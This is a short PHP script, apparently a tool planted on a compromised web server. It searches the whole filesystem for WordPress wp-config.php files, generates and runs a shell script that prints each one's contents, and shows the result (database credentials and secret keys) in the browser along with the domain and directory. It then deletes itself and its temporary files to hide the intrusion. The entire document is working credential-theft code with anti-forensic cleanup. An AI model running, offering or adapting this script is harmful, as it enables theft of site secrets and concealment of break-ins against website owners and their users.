<?php
$asu	= shell_exec("find / -name wp-config.php | grep -v 'Permission denied'");
echo '<font color=purple>r00t@trenggalek6etar:</font>~/pwnedz$</font><br>';
echo 'DOMAIN : <font color=green>'.$_SERVER['SERVER_NAME'].'</font><br>';
echo 'DIR : <font color=red>'.getcwd().'</font><br>';
echo '<textarea name="jembot" cols="150" rows="10" id="jembot">'.$asu.'</textarea><br>';
$fh = fopen('filene.txt', 'w');
fwrite($fh,$asu);
system("sed 's/^/cat /;' filene.txt > gas.sh");
$response = shell_exec("chmod +x gas.sh; bash gas.sh");
echo '<textarea name="jembot" cols="150" rows="10" id="jembot">'.$response.'</textarea><br>';
unlink(__FILE__);
unlink("filene.txt");
unlink("gas.sh");